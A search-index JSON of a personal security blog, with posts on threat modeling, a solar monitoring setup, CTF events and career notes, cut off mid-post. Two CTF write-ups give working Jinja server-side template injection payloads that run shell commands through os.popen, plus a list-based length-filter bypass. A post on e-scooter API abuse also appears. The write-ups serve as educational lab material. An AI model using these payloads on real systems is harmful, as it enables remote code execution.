[ { "title": "Sicherheit von Anfang an: Die entscheidende Rolle von Bedrohungsanalysen in der Softwareentwicklung", "url": "/posts/Sicherheit-von-Anfang-an-Die-entscheidende-Rolle-von-Bedrohungsanalysen-in-der-Softwareentwicklung/", "categories": "SECURITY", "tags": "Threat Modeling", "date": "2023-06-13 21:25:26 +0200", "snippet": "Bei der Entwicklung von Software ist die Sicherheit der Anwendung von größter Bedeutung. Die rechtzeitige Durchführung einer Bedrohungsanalyse ist ein wichtiger Schritt, um potenzielle Risiken und Schwachstellen frühzeitig zu erkennen und geeignete Sicherheitsmaßnahmen zu ergreifen.Wann sollte eine Bedrohungsanalyse durchgeführt werden?Eine Bedrohungsanalyse sollte idealerweise schon zu Beginn des Entwicklungsprozesses stattfinden, noch bevor der eigentliche Code geschrieben wird. Dadurch können potenzielle Sicherheitslücken und Risiken frühzeitig identifiziert werden. Eine Bedrohungsanalyse sollte auch durchgeführt werden, wenn signifikante Änderungen an der Anwendung vorgenommen werden oder wenn neue Bedrohungen in der Umgebung auftreten.Wie oft sollte eine Bedrohungsanalyse durchgeführt werden?Die Häufigkeit der Bedrohungsanalysen hängt von verschiedenen Faktoren ab, wie beispielsweise der Komplexität der Anwendung, der Bedrohungslandschaft und den regulatorischen Anforderungen. Generell wird empfohlen, regelmäßige Bedrohungsanalysen während des gesamten Softwareentwicklungslebenszyklus (SDLC) durchzuführen, insbesondere bei wichtigen Meilensteinen oder vor der Veröffentlichung einer neuen Version der Anwendung.Was ist der SDLC?Der SDLC (Software Development Life Cycle) ist ein strukturierter Ansatz für die Entwicklung von Softwareanwendungen. Er umfasst verschiedene Phasen wie Anforderungsanalyse, Design, Implementierung, Testing und Betrieb. Der SDLC bietet einen Rahmen für die effiziente Entwicklung qualitativ hochwertiger Software.In welcher Phase des SDLC sollte eine Bedrohungsanalyse stattfinden?Eine Bedrohungsanalyse sollte frühzeitig im Entwicklungsprozess, idealerweise in der Designphase des SDLC, durchgeführt werden. Dies ermöglicht es, potenzielle Sicherheitslücken frühzeitig zu erkennen und Sicherheitsmechanismen in das Design der Anwendung zu integrieren. Eine rechtzeitig durchgeführte Bedrohungsanalyse hilft dabei, kostenintensive Nachbesserungen zu vermeiden und das Risiko unentdeckter Sicherheitslücken zu verringern.Was kann passieren, wenn man eine Bedrohungsanalyse erst später im SDLC durchführt?Wenn eine Bedrohungsanalyse erst spät im SDLC oder sogar nach der Implementierungsphase durchgeführt wird, besteht die Gefahr, dass Sicherheitsrisiken und Schwachstellen übersehen werden. Das Beheben dieser Lücken in späteren Phasen erfordert mehr Ressourcen und Zeit, da möglicherweise umfangreiche Änderungen am Design oder an der Implementierung erforderlich sind.Sind Sie neugierig auf das Thema Bedrohungsanalyse geworden? Dann kontaktieren Sie mich jetzt!" }, { "title": "Bedrohungsanalyse - Eine kurze Einführung in das Threat Modeling", "url": "/posts/Bedrohungsanalyse-Eine-kurze-Einf%C3%BChrung-in-das-Threat-Modeling/", "categories": "SECURITY", "tags": "Threat Modeling", "date": "2023-05-24 20:25:26 +0200", "snippet": "In unserer vernetzten Welt sind Unternehmen und Organisationen zunehmend der Gefahr von Cyber-Bedrohungen ausgesetzt. Eine Methode, um die Sicherheit von Systemen zu stärken und potenzielle Schwachstellen zu identifizieren, ist das Threat Modeling, also die Bedrohungsanalyse. In diesem Artikel werde ich einen Einblick in das Thema Threat Modeling geben und die Vorteile sowie den Prozess einer Bedrohungsanalyse beleuchten.Vorteile des Threat ModelingsDie Durchführung einer Bedrohungsanalyse bietet eine Reihe von Vorteilen für die Absicherung eines Systems. Dies sind die wichtigsten: Risikominderung: Durch die Identifizierung potenzieller Bedrohungen können Schwachstellen in einem System frühzeitig erkannt werden, noch bevor sie von Angreifern ausgenutzt werden können. Kosteneffizienz: Eine rechtzeitige Identifizierung von Schwachstellen und die Implementierung entsprechender Gegenmaßnahmen sind kosteneffizienter als die spätere Behebung von Sicherheitslücken oder der Umgang mit den Folgen eines Sicherheitsvorfalls. Eine Bedrohungsanalyse trägt auch zur Priorisierung von Sicherheitsmaßnahmen bei, sodass Ressourcen effizient eingesetzt werden können. Für welche Systeme eignet sich eine Bedrohungsanalyse?Eine Bedrohungsanalyse eignet sich für alle Arten von Systemen und Anwendungen. Ob es sich um Webanwendungen, Netzwerke, mobile Apps oder IoT-Geräte handelt, das Threat Modeling bietet eine strukturierte Methode, um potenzielle Bedrohungen zu identifizieren und effektive Sicherheitsmaßnahmen zu entwickeln.Neben digitalen Systemen kann eine Bedrohungsanalyse auch zur Bewertung der physischen Sicherheit eines Standorts oder einer Einrichtung eingesetzt werden.Wer sollte an einer Bedrohungsanalyse teilnehmen?Eine erfolgreiche Bedrohungsanalyse erfordert die Beteiligung verschiedener Experten. IT-Sicherheitsexperten: Diese Experten tragen ihr Wissen über Sicherheitsrisiken und Angriffsmethoden bei, um die Analyse zu verbessern. Entwickler und Architekten: Ihr technisches Verständnis des Systems ist von entscheidender Bedeutung, um potenzielle Schwachstellen zu erkennen und entsprechende Gegenmaßnahmen zu planen. Geschäftsvertreter: Vertreter aus dem Geschäftsbereich können Einblicke in geschäftliche Anforderungen, Kundendaten und betriebliche Risiken liefern. Durch die Einbindung verschiedener Perspektiven wird sichergestellt, dass alle relevanten Aspekte berücksichtigt werden und ein umfassendes Verständnis der Bedrohungen und deren Auswirkungen besteht.Wann sollte eine Bedrohungsanalyse durchgeführt werden?Eine Bedrohungsanalyse sollte idealerweise in den frühen Phasen des Systemdesigns oder der Anwendungsentwicklung durchgeführt werden. Durch die frühzeitige Identifizierung von Bedrohungen können Sicherheitsaspekte von Anfang an in den Entwicklungsprozess integriert werden. Eine Aktualisierung des Threat Models sollte auch bei wesentlichen Änderungen am System oder bei neuen Bedrohungen durchgeführt werden.Wie führt man eine Bedrohungsanalyse durch?Die Durchführung einer Bedrohungsanalyse besteht aus mehreren Schritten: Systemverständnis: Erstellen eines detaillierten Überblicks über das zu analysierende System, einschließlich seiner Komponenten, Funktionen und Datenflüsse. Bedrohungsidentifikation: Identifizieren potenzieller Bedrohungen, die das System gefährden könnten. Dazu gehören interne und externe Bedrohungen sowie gezielte Angriffe. Priorisierung: Bewertung der identifizierten Bedrohungen anhand ihrer Auswirkungen und Wahrscheinlichkeiten, um die Dringlichkeit von Gegenmaßnahmen zu bestimmen. Gegenmaßnahmen: Entwicklung geeigneter Sicherheitsmaßnahmen und Kontrollen, um die identifizierten Bedrohungen zu minimieren oder zu eliminieren. FazitEine Bedrohungsanalyse ist ein unverzichtbarer Bestandteil eines ganzheitlichen IT-Sicherheitskonzepts. Durch die systematische Identifizierung und Bewertung von Bedrohungen können Organisationen effektive Sicherheitsmaßnahmen entwickeln unddas Risiko von Sicherheitsverletzungen minimieren.Die Anwendung einer Bedrohungsanalyse kann auf verschiedene Bereiche wie Webanwendungen, Netzwerke oder physische Einrichtungen angewendet werden.Jetzt den Autor kontaktieren" }, { "title": "Building a Smart Home Energy Monitoring System", "url": "/posts/Building-a-Smarthome-Energy-Monitoring-System/", "categories": "SMARTHOME", "tags": "smarthome, home automation, renewable energy", "date": "2023-05-23 20:25:26 +0200", "snippet": "In my quest to monitor and optimise my home’s solar energy system, I ventured into the world of Docker, InfluxDB and Grafana. With little prior knowledge of these technologies, I was determined to learn and apply them to create a smart home energy monitoring system. This article describes my experiences, the challenges I faced, and the valuable insights I gained along the way.Key technological componentsHardware An old Mac Mini was repurposed as the central system to host the energy monitoring setup. This Mac Mini, part of the home network, served as a reliable and low-power device to run the necessary components.Software Docker was used to create containers for running the different components of the energy monitoring system. Containers provide a lightweight and isolated environment, ensuring consistent deployment across different systems. - Leveraging Docker’s containerization, I could isolate and manage the components of my energy monitoring system, ensuring portability and ease of deployment. InfluxDB, a modern database, was utilized to store the energy consumption data. With its efficient data storage and retrieval capabilities, it facilitated the collection and analysis of time-based data. - With its time-series storage capabilities, I could efficiently capture and store energy consumption data. InfluxDB’s flexibility and query language allowed me to analyze and visualize the data effectively. Grafana acted as the visualization and monitoring platform for the energy data. It allowed the creation of customizable dashboards with interactive panels, enabling real-time monitoring and data analysis and became the centerpiece of my energy monitoring system. With its rich visualization features and user-friendly interface, I could create dynamic dashboards and gain meaningful insights from the collected energy data. Python programming language was used to develop the script responsible for collecting energy data from the solar system. The script was responsible for collecting energy data from the solar system. It utilized APIs to retrieve the data, performed necessary calculations, and sent the processed data to InfluxDB for storage. Tailscale, a VPN solution, provided secure and remote access to the energy monitoring system, enabling me to access Grafana and manage the system from my smartphone, regardless of my location. Project Journey Learning Python: With a basic understanding of Python, I saw this project as an opportunity to further develop my programming skills. I utilized Python to collect energy data from my solar system and send it to InfluxDB for storage and analysis. Repurposing the Mac Mini: To run the energy monitoring system, I repurposed an old Mac Mini that was primarily used as a backup system and for running an ad-blocker based on PiHole. This choice provided a cost-effective solution and allowed me to integrate the monitoring system into my existing home network. Future Expansion: As my project evolved, I envisioned expanding the monitoring system to include energy consumption data from various devices in my home. This would allow for a comprehensive view of energy usage and enable me to identify additional optimization opportunities. Hands-on Experience: Through this project, I gained valuable hands-on experience with Docker, InfluxDB, Grafana, and Python programming. I deepened my understanding of these technologies and learned how they could be leveraged to solve real-world problems. Data Visualization: Grafana’s visualization capabilities empowered me to transform raw energy data into meaningful insights. I learned how to create informative dashboards, customize panels, and utilize various visualizations to effectively communicate energy consumption trends. ConclusionIn my journey of building a smart home energy monitoring system with Docker, InfluxDB, and Grafana, I transformed my curiosity into practical skills and valuable insights. By leveraging these technologies, I gained a deeper understanding of my solar energy system, optimized energy usage, and developed proficiency in Python programming. The combination of Docker’s containerization, InfluxDB’s time-series data storage, Grafana’s visualization capabilities, and Tailscale’s secure remote access opened up a world of possibilities for monitoring and managing energy consumption.Whether you’re a tech enthusiast, a home automation enthusiast, or someone passionate about renewable energy, this project provides an exciting opportunity to explore and learn key technologies while making a positive impact on your energy consumption. Embrace the possibilities, embark on your own smart home energy monitoring journey, and unlock a smarter, more efficient, and sustainable future." }, { "title": "YesWeHack - Live Bug Bounty at Nullcon Berlin 2023", "url": "/posts/Nullcon-2023-Live-Bug-Bounty-event/", "categories": "SECURITY", "tags": "Hacking, Bug Bounty, Video", "date": "2023-05-14 19:25:26 +0200", "snippet": "On March 9-10, 2023, YesWeHack collaborated with OTTO, Germany’s leading e-commerce retailer, to host a Live Bug Bounty during the Nullcon Berlin conference, which is highly regarded in the European offensive security community.The event brought together a group of talented bug bounty hunters to identify potential vulnerabilities on OTTO’s exclusive perimeter, culminating in an intense 30-hour hacking session. Dozens of participants took part in this unique opportunity to showcase their skills and compete for rewards while helping to improve OTTO’s security measures." }, { "title": "Recap - Hacker Things CTF 2022", "url": "/posts/hacker-things-ctf-2022/", "categories": "CTF", "tags": "infosec, ctf", "date": "2022-11-27 14:51:26 +0100", "snippet": "Am 26. November 2022 hat der Hacker Things CTF stattgefunden. Für mich persönlich war es das dritte Capture the Flag Event in diesem Jahr. Allerdings war es auch mein erstes Onsite-CTF. Die weite Anreise von Hamburg nach Bonn hat sich aber durchaus gelohnt.Die Veranstaltung wurde vom Team rund um Andreas und Moritz von Laokoon SecurITy in Zusammenarbeit mit CGI organisiert und vom SANS Institute, Hack The Box und IBM gesponsert.Niels und seine KollegInnen haben mit der modern gestalteten IBM Garage for Defense im Bonner Regierungs- und Botschaftsviertel eine tolle Event-Location zur Verfügung gestellt und sich dabei als großartige Gastgeber erwiesen.Gespielt wurde im weitverbreitetem Jeopardy-Style und die von Hack The Box bereitgestellten Challenges waren wie erwartet von bester Qualität.Insgesamt gab es 63 TeilnehmerInnen, die in Teams aus bis zu drei Personen ihr Können in den folgenden Kategorien beweisen konnten. OSINT MISC WEB FORENSIC JAIL-BREAKOUT FULL-PWN CRYPTO PWN REVERSINGNach sechs Stunden hat der 23 jährige Dragos Albastroiu im Alleingang mit 14 Flags die maximale Punktzahl erreicht und sich damit den 1. Platz gesichert. Dragos darf sich nun über die Teilnahme an einer SANS-Schulung freuen und sein Wissen noch weiter vertiefen.Den zweiten Platz hat sich Team FluxFingers verdient, gefolgt vom CTF-Team der TU Darmstadt auf Platz drei.Ab 20 Uhr ging es nach der Siegerehrung zu einem fröhlichen Get-Together über. In entspannter Atmosphäre bot sich bei Pizza, Mate, Kuchen und Bier die Gelegenheit neue Kontakte zu knüpfen. Hier konnte man sich über die CTF-Challenges und andere Themen austauschen und es wurde viel miteinander gelacht.Für mich persönlich stellte sich spätestens jetzt das angenehme Gefühl einer offenen Community ein. Es war ein Zusammentreffen von freundlichen Menschen, die sich für IT-Security begeistern und ihre Erfahrungen bereitwillig austauschen. Frei von Rivalität oder Vorurteilen.Ein großes Dankeschön an die Organisatoren für ihre tolle Arbeit, den reibungslosen Ablauf sowie die angenehme Atmosphäre. Ich freue mich schon auf eine erneute Teilnahme im kommenden Jahr.Weiterführende Links: Offizielle Event-Website Beitrag vom WDR Event auf CTF-Time" }, { "title": "Who let the birds out?", "url": "/posts/who-let-the-birds-out/", "categories": "HACKING", "tags": "infosec", "date": "2022-09-20 17:25:26 +0200", "snippet": "Some General Information about Bird E-ScootersBird e-scooters are becoming more and more popular in bigger cities. And despite the fact that they are laying around like pieces of ugly looking electronic trash, they are sometimes actually quite useful.And they are easy to get. You just need to open the nice looking mobile app, find a bird nearby and then finally book it. That’s it. - Enjoy your ride!Just in case you can’t find the desired bird for some reason you are also able to use a nice little feature to let the bird chirp. Making some kind of noice and blinking lights to help you with a little orientation, when it’s dark outside.Let’s have some funAnalyzing the network traffic between the Bird mobile app and the Bird servers shows two interesting API endpoints that are used to help you getting your next ride.https://api-bird.prod.birdapp.com/bird/nearby and https://api-bird.prod.birdapp.com/bird/chirp.The first one is used to get a list of all birds within a specific radius and the second one is used to let a Bird chirp.Sounds great, eh?What would happen if someone would try to let more than one bird scooter chirp?Well, there is nothing stopping you from trying to do this.Here is a short demonstration (a click will open YouTube)Imagine someone would add different locations, where a lot of Birds are located, into this proof of concept.Imagine someone would set the radius to a very high number and put all of this into an infite loop… Ooops.I’m pretty sure the same is possible with other providers such as Tier, but I didn’t have the time to test it.LearningsLimits everywhereThe Bird API should have different types of limits implemented. The allowed value for the radius should be limited. The number of Birds you receive from the API is limited to 250. But do you really need information about 250 Bird E-Scooter nearby? This value should also be limited. And the number of requests we are able to send to /bird/chirp within a reasonable amount of time should also be limited.Make it easy to get in contactThe people at Bird don’t use /.well-known/security.txt so I’ve tried to contact them via Twitter and e-mail.This is what I got in response:So please as a company use the security.txt or start a bug bounty program to make reporting security findings easier.Thanks for reading and thanks a lot to @Zyberum for the inspiration for this little fnord experiment." }, { "title": "CSD 2021 Snake Jazzzzz Write-Up", "url": "/posts/csd-2021-snake-jazzz/", "categories": "CTF", "tags": "infosec, ctf, writeup", "date": "2021-11-21 18:11:26 +0100", "snippet": "In November 2021 I was part of a small team (‘Tychologen’) that took part in the Cyber Security Days 2021 thankfully organized by the Ostschweizer Fachhochschule.This is a short write-up for one of the web security challenges called “Snake Jazzzzz”, which was rated with easy difficulty.If you are interested in a write-up for the Muffin Shop challenge, you will find it here.Introduction The federation of Rattlestar Ricklactica has developed a postcard creator for interdimensional visitors to greet their imperiors from far away. The almighty WAF protects the global treasury from adversaries. Goal:Can you prove that their snake technology is inferior to our human hacking skills?My SolutionFirst things first. I use the Wappalyzer browser extension to figure out, which technologies are used in this web applicationOkay we have Python Flask here in the backend.This is what we see when we visit the web application for the first time:A simple HTML form with three input fields.Let’s try a simple Cross Site Scripting injection (XSS) here.But what’s that? Seems like some kind of Web Application Firewall (WAF) is in place here.Okay let’s have a look into the source code of that page.There is a HTML comment inside pointing us to the /source path.After having a look into /source, we get this beautiful Python code.from flask import Flask, render_template, request, render_template_string, Responseapp = Flask(__name__, static_url_path=&#39;/Static&#39;, static_folder=&#39;Static&#39;)@app.route(&quot;/&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])def index(): template = open(&quot;/app/template.html&quot;, &quot;r&quot;).read() print(request.json) if request.method == &#39;GET&#39;: title = &#39;&amp;lt;input id=&quot;title&quot; data-index=&quot;1&quot; type=&quot;text&quot; placeholder=&quot;Title&quot; class=&quot;form-control form-control-underlined border-info&quot;&amp;gt;&#39; info = &#39;&amp;lt;input id=&quot;sender&quot; data-index=&quot;1&quot; type=&quot;text&quot; placeholder=&quot;Sender&quot; class=&quot;form-control form-control-underlined border-info&quot;&amp;gt;&amp;lt;input id=&quot;recipient&quot; data-index=&quot;1&quot; type=&quot;text&quot; placeholder=&quot;Recipient&quot; class=&quot;form-control form-control-underlined border-info&quot;&amp;gt;&#39; template = template.replace(&quot;TITLE_HERE&quot;, title).replace(&quot;INFO_HERE&quot;, info) return render_template_string(template) data = { &quot;title&quot;: request.json[&quot;title&quot;], &quot;sender&quot;: request.json[&quot;sender&quot;], &quot;recipient&quot;: request.json[&quot;recipient&quot;], } for key in data.values(): if len(key) &amp;gt;= 15: template = template.replace(&quot;TITLE_HERE&quot;, &quot;HACKING DETECTED BY SNAKE WAF&quot;).replace(&quot;INFO_HERE&quot;, &quot;HACKING DETECTED BY SNAKE WAF&quot;) return render_template_string(template) info = &quot;&quot;&quot; &amp;lt;h2&amp;gt;SsssSSSSSSSS SsSSSSSSSSS sssSSSSS {}&amp;lt;/h2&amp;gt; &amp;lt;h4&amp;gt;{} SsssSSSSS SSsssSSSSS SsssSSSSS SSSSsssSSSSS SsssSSSSS sssS SSSS SssSSSSS sssSSSsssSS&amp;lt;/h4&amp;gt; &amp;lt;h4&amp;gt;SsssSSSSSSS SSsssSSSSS SsssSSSSSsssS SSSS SsssSSSSSSSSS sssSSSSS SssSSSSSs ssSSSsssSS&amp;lt;/h4&amp;gt; &quot;&quot;&quot;.format( data[&quot;recipient&quot;], data[&quot;sender&quot;]) template = template.replace(&quot;TITLE_HERE&quot;, data[&quot;title&quot;]).replace(&quot;INFO_HERE&quot;, info) return render_template_string(template)@app.route(&quot;/source&quot;, methods=[&quot;GET&quot;])def source(): return Response(open(__file__).read(), mimetype=&#39;text/plain&#39;)if __name__ == &quot;__main__&quot;: app.run(host=&quot;0.0.0.0&quot;, port=1337)Now we know the routes of this Flask app: /source and / which will accept GET and POST HTTP request. No fuzzing with gobuster needed here and we have a small attack surface here.Here is where the WAF obstacle is coming into our way:for key in data.values(): if len(key) &amp;gt;= 15: template = template.replace(&quot;TITLE_HERE&quot;, &quot;HACKING DETECTED BY SNAKE WAF&quot;).replace(&quot;INFO_HERE&quot;, &quot;HACKING DETECTED BY SNAKE WAF&quot;) return render_template_string(template)Our input is limited to 15 characters. Everything longer than that will be replaced with the WAF notice.Hmm…At this point I’ve tried to inject some JavaScript code by concatenating the strings from the different input fields, but had no luck doing this.But from another challenge ( Muffin Shop ), which was part of the Cybersecurity Day 2021 CTF , I allready knew about Server Side Template Injection (SSTI) in applications that uses Python Flask and miss proper input validation.So let’s try the same thing here.And it works!This is great cause now we are able to execute code. But there is still the limit of 15 characters we need to overcome.Let’s have another look into the source code and see how the input is handled.info = &quot;&quot;&quot; &amp;lt;h2&amp;gt;SsssSSSSSSSS SsSSSSSSSSS sssSSSSS {}&amp;lt;/h2&amp;gt; &amp;lt;h4&amp;gt;{} SsssSSSSS SSsssSSSSS SsssSSSSS SSSSsssSSSSS SsssSSSSS sssS SSSS SssSSSSS sssSSSsssSS&amp;lt;/h4&amp;gt; &amp;lt;h4&amp;gt;SsssSSSSSSS SSsssSSSSS SsssSSSSSsssS SSSS SsssSSSSSSSSS sssSSSSS SssSSSSSs ssSSSsssSS&amp;lt;/h4&amp;gt; &quot;&quot;&quot;.format( data[&quot;recipient&quot;], data[&quot;sender&quot;]) template = template.replace(&quot;TITLE_HERE&quot;, data[&quot;title&quot;]).replace(&quot;INFO_HERE&quot;, info) return render_template_string(template)Okay, format() is used to put the values of the recipient and sender fields into the info string. But title is handled with replace().What is the difference between format() and replace() ?It’s time for a small experiment with Python.print(&quot;This is a short text&quot;.replace(&quot;short&quot;, &quot;very short&quot;))# --&amp;gt; This is a very short textprint(&quot;This is {} text&quot;.format(&quot;very long&quot;))# --&amp;gt; This is very long textBoth methods will replace a string inside a given text. But what happens when we provide a list as argument for both methods?myList = [&#39;hello from inside the list&#39;]print(&quot;This is a {} text&quot;.format(myList))# --&amp;gt; This is a [&#39;hello from inside the list&#39;] textprint(&quot;This is a short text&quot;.replace(&quot;short&quot;, myList))# --&amp;gt; TypeError: replace() argument 2 must be str, not listAs we can see here, replace() only accepts string arguments, whereas format() also allows list-type arguments.That’s good to know cause what is the obstacle? The limit of 15 characters for the user input.for key in data.values(): if len(key) &amp;gt;= 15: template = template.replace(&quot;TITLE_HERE&quot;, &quot;HACKING DETECTED BY SNAKE WAF&quot;).replace(&quot;INFO_HERE&quot;, &quot;HACKING DETECTED BY SNAKE WAF&quot;) return render_template_string(template)The pseudo WAF implented here is based on the len() method. So any input longer than 15 characters will be blocked. BUT what is the length of a Python list? It’s the number of elements inside that list.myList = [&#39;hello from inside the list&#39;]print(len(myList))# --&amp;gt; 1That means we can bypass the length limit by using list-type elements as input.Let’s do this by using Burp repeater.Both values of recipient and sender are longer than the allowed 15 characters. But because of the usage of the len() method in combination with the inputted list-elements, we getNow we are able to use the SSTI and can bypass the size limit.So what’s next?book.hacktricks.xzy contains some examples on how to exploit this vulnerability to achieve Remote Code Execution (RCE).I could use the following input to get the username, the current directoy and a directory listing.{ &quot;title&quot;:&quot;&quot;, &quot;recipient&quot;:[ &quot;{{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;whoami&#39;).read()}}&quot; ], &quot;sender&quot;:[ &quot;{{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;pwd;ls -al&#39;).read()}}&quot; ]}Then I’ve used{{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;find / -name \\\\*flag\\\\* &amp;gt; find-flag.txt &amp;amp;&amp;amp; cat find-flag&#39;).read()}}to search for all files that contain flag in it’s name and afterwards cat the results out.My Learnings When XSS and SQLi don’t work, try SSTI Don’t rely on simple ways such as len() to validate user input. It’s useful to understand the different behaviour of Python format() and replace() book.hacktricks.xyz is an awesome resource and always a look worth PortSwigger Academy is a great reference to learn more about SSTIAcknowledgmentsThanks a lot to Ostschweizer Fachhochschule for organizing this CTF event." }, { "title": "CSD 2021 Muffin Shop Write-Up", "url": "/posts/csd-2021-muffin-shop/", "categories": "CTF", "tags": "infosec, ctf, writeup", "date": "2021-11-21 14:11:26 +0100", "snippet": "In November 2021 I was part of a small team (‘Tychologen’) that took part in the Cyber Security Days 2021 thankfully organized by the Ostschweizer Fachhochschule.This is a short write-up for one of the web security challenges called “Muffin Shop”, which was rated with medium difficulty.I will publish two differnet solutions here. At first my own and then a shorter and smarter method by Lexiea, who also took part in the event.Introduction I’ll take you to the muffin shop (düdü düdü) I’ll let you inject your little ….. payload… i guess. Anyway. Start the container and have a go at this little challenge. Goal:Retrieve the flag from the template folder in a file creatively called ‘flag.html’. Good luck!My SolutionThis is what we see when we visit the web application for the first time:Let’s have a look into the source code of that page.But there is nothing of interest in here.So I started gobuster and discovered other endpoints.But ‘login’ is the only functionality that is implemented in this version of the muffin shop.Thankfully the CTF organzisers provided the source code of the application, so I could save a lot of time and jump directly into analyzing it.From the source code we know that only three functions are actually working:loginBut the login function doesn’t do anything, but writing the login attempts into a log file. So it’s not possible to log into a user’s account and attacks like SQL injection won’t work here.logsThis method will render a template called ‘logs.html’.Let’s have a look on it:As assumed our login attempts are logged and we are able to see all of them here.rotate_logsWe can use this methode to clean up the log file.It seems like this challenge is litteraly screaming for some kind of log poisoning.From the source code we know that the app is using the Flask library. After a short visit of one my favorite websites book.hacktricks.xyz I tried a Server Side Template Injection (SSTI) and entered{{7 * 7}} as the username.And as assumed my input is evaluated by the backend, as we can see the number 49 in the log-file.So what’s next?book.hacktricks.xzy also contains some examples on how to exploit this vulnerability to achieve Remote Code Execution (RCE).I’ve used{{ config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;la -al&#39;).read() }}to list the content of the current direcory.Then I’ve used{{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;find / -name \\\\*flag\\\\* &amp;gt; find.txt &amp;amp;&amp;amp; cat find.txt&#39;).read()}}as input for the username to search for all files that contain flag in it’s name and afterwards cat the results out.And got this as resultsSo finally the last step was to use{{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat /app/templates/flag.html&#39;).read()}}to get the content of flag.htmlLexiea’s WayUser Lexiea found another, way smarter solution and shared it after the official solution was provided.Damn, that was smart.I tried this method on my own and entered{% set logged_in = true %}{% include &#39;flag.html&#39; %}And voilà we get the flag without using a lot of SSTI kung-fu.My Learnings When XSS and SQLi don’t work, try SSTI It’s super useful to understand how @requires_login in Python Flask works book.hacktricks.xyz is an awesome resource and always a look worth PortSwigger Academy is a great reference to learn more about SSTIAcknowledgmentsThanks a lot to Ostschweizer Fachhochschule for organizing this CTF event.Thanks to Lexiea for sharing the smarter solution with us!" }, { "title": "Why I call myself a Hacker", "url": "/posts/why-I-call-myself-a-hacker/", "categories": "HACKING", "tags": "", "date": "2021-10-13 22:21:26 +0200", "snippet": "I think I was 8 years old, when my older brother and me where sitting in front of a 2.5MHz computer, the Robotron A 5120.We spent the past hours typing characters and strange symbols from a paper magazine into this weird machine and had absolutly no clue what all that should mean. After some time and fixing a lot of typos, we somehow managed to transfer all those pieces of information from written paper into this miraclous machine. And then, I can’t remember how, we started the executation of this code. In a magically way a computer game (somekind of a space invaders clone) appeared on the black screen with green characters.That was a magical moment for me, that changed my entire life. From this day on I felt in love with computers and so I spent a lot of time figuring out how they work, how to create things (mainly with Basic and C++), how to make them faster. More computers followed after this first expierence such like Atari, Amiga, my first Intel 80386.What a crazy time we had back in the 90’s…One day I’ve read ‘How to become a Hacker’ by Eric Steven Raymond and get interested in the Hacker Culture.I sticked with computers and programming, worked in IT in different roles and always wanted to learn more. Wanted to know how things work, wanted to find new creative ways to use computer systems, I always tried to improve things.That’s why I call myself a hacker.It’s not because I’m an expert level software developer (no I’m not) nor because I know all details about Unix operating systems or anything like that. - Nope, it’s the inner attitude to stay humble and curious. The willingness to share my knowledge with others. All of that not only in the digital world, but also in other areas of life.Hacking is not a crime. It’s a creative way to explore the world we live in and to make it better." }, { "title": "📌 Welcome!", "url": "/posts/pinned-welcome/", "categories": "META", "tags": "", "date": "2021-10-13 15:28:55 +0200", "snippet": "If you’re new here, why don’t you check out the about page to get to know me better?You will find some general information about me as well as ways to contact me." }, { "title": "What I’ve learned during my Rookie Year in Cyber Security", "url": "/posts/my-rookie-year-in-cyber-security/", "categories": "lessons-learned", "tags": "infosec", "date": "2020-12-29 23:11:26 +0100", "snippet": "My Starting PointOne year ago I finally decided to make a dream come true for myself and to get into the field of cyber security. At this point, I was 36, happily married, father of two kids and had a good job working as a product owner for a large German based e-commerce company.I already had some practical experience with hacking tools, like nmap, John the Ripper and the like and also had a solid foundation on IT concepts like networks, system architecture, programming languages, APIs and so on from former jobs.But since I’ve written my first lines of code in QBasic and Turbo Pascal for the first time, I always wanted to become something like a “Hacker”. So because, I already knew that I was unhappy with my job at this point and that it was time for a change, I decided to give my old a dream a chance to become true.At this time I’ve had a somekind romantic imagination of what it would be to work in IT security. I had hoped for hacking all kind of things and becoming something like a cyber ninja warrior or black magic cyber wizard that could hack into any system and do all kind of crazy things.And it took me a while to get rid of this idea…Where to start?I played around with Hack The Box and OverTheWire Wargames to ensure, that I was realy intrested in learning more about information security and whether I was even able to learn stuff like this. Both are great options, to play around for a while without investing any money. All I needed was time and mental will. (I’ didn’t know Web Security Academy at this moment.) After two weeks I decided to continue this path and to take my initial idea more seriously.From Noob to OSCPI’ve read tons of blog posts about the Offensive Security OSCP certification and decided to take this cert for three reasons: OSCP has a very good reputation and is valued among experts. I was sure to learn a lot from it. Paying for this training from my own savings ensured that I got fully involved over a longer period of time.Since I had a family, a job and a real life I decided for the biggest package with 90 days of virtual lab time. — And during the next months, I’ve learned sooo many things about the in-security of computer systems, about other people and also about myself and how my brain works.But I’ve learned even more from it: Getting the mindset of a hacker. “Trying harder” is only one small part of it. — Changing your perspectives over and over, escaping from rabbit holes, googling everything you don’t know and how to document your progress is the bigger part. I’ve seen this video so many times during these days and it still makes me smile today. The InfoSec community is absolutly awesome! I’ve met so many kind and helpful people on the InfoSec Prep discord server and nearly everyone was ready to help me in one or another way. Someone even teached me via video call and screensharing how to do buffer overflows. And even now not a day goes by, that I don’t learn something new, because a member of the community is ready to share knowledge with me, for free. Virtual Hacking Labs is a great addition to the OSCP learning materials and to the lab offered be Offensive Security. I’m sure that I only was able to pass the OSCP exam on my first approach, because I’ve spent an additional month to train my skills and methodology on VHL. Having the OSCP certification dosn’t mean everything in the world, but it helps a lot in finding a job (at least in Germany). — But the OSCP is by far not the the end of your learning path, it’s just one of the first steps.Becoming a Certified Ethical HackerI actually wanted to do the Certified Ethical Hacker course before the OSCP, but at this point the certification course was to expensive for me. The price was around 4.000 Euro for five days of on site training and an exam attempt. Then after the OSCP I catched an offer to do the training online over a period of 12 months, for only the half of the original price.I wanted to get this certification for two main reasons: At least in Germany, this cert helps to get recognized by HR people. I didn’t had any practical experience working in IT security and so I thought I needed something like an extra booster to pimp my CV and to make clear that I’m highly motivated to get into this field.Lessons learned from doing the CEH: It’s good to show possible employers that you have a very good understanding of IT security basics, networking and general tools like nmap. But for me it was very boring after doing the OSCP, because of it’s heavy theoretical approach. I only glimpsed through aproximatly 3 percentage of the courseware and have heavily worked through this book instead. It contains everything I needed to know and in combination with this app I was able to prepare for passing the exam. You can save a lot of money by doing the exam without attending an official CEH training, if you already have at least 2 years of information security related job experience. Official prices can be found here.Where to go from here? Focus Daniel-san, focus!A friend of mine is working at Google and in his early days in this small search-enginge company one of his colleagues told him, that if you want to be succesful, 